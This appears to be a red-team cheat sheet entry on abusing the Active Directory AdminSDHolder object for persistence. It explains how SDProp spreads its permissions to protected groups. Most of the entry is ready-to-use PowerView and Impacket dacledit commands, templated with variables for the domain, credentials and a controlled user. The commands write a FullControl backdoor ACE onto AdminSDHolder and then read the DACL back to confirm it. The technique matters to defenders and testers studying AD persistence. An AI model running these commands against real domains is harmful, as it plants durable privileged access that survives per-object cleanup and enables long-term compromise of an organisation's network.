---
technique: AdminSDHolder Abuse
category: persistence
targets: AdminSDHolder Object, Protected AD Principals
protocols: LDAP
remote_capable: true
tags: persistence adminsdholder dacl acl sdprop protected-groups ldap
---

# AdminSDHolder Abuse

The SDProp process runs every 60 minutes and copies the AdminSDHolder object's DACL onto all protected AD principals (Domain Admins, Account Operators, etc.). Adding an ACE granting a controlled principal `GenericAll` on `CN=AdminSdHolder,CN=System,DC=DOMAIN,DC=LOCAL` causes SDProp to propagate that privilege to every protected object, providing durable persistence that survives manual ACL cleanup on individual objects.

## Windows

PowerView's `Add-DomainObjectAcl` writes the backdoor ACE directly against the AdminSDHolder object.

### Add-DomainObjectAcl (PowerView)

#powershell #powerview #dacl

Grant a controlled principal full control over AdminSDHolder so SDProp propagates that right to all protected objects.

```powershell title:"Backdoor AdminSDHolder DACL with PowerView"
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity "$controlled_user" -Verbose -Rights All
```
<!-- cheat
var controlled_user
-->

### Get-DomainObjectAcl (PowerView)

#powershell #powerview #recon

Inspect AdminSDHolder's DACL to confirm a backdoor ACE is present or audit existing permissions.

```powershell title:"Inspect AdminSDHolder DACL with PowerView"
Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs
```
<!-- cheat -->

## Linux

dacledit.py from Impacket writes and reads ACEs on the AdminSDHolder object over LDAP.

### dacledit (write)

#python #ldap #impacket

Add a FullControl ACE for a controlled principal to the AdminSDHolder object's DACL.

```sh title:"Write FullControl ACE to AdminSDHolder DACL with dacledit"
dacledit.py -action write -rights FullControl -principal "$controlled_user" -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_user
-->

### dacledit (read)

#python #ldap #recon #impacket

Read the current AdminSDHolder DACL to verify the backdoor ACE was applied.

```sh title:"Read AdminSDHolder DACL with dacledit"
dacledit.py -action read -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
-->
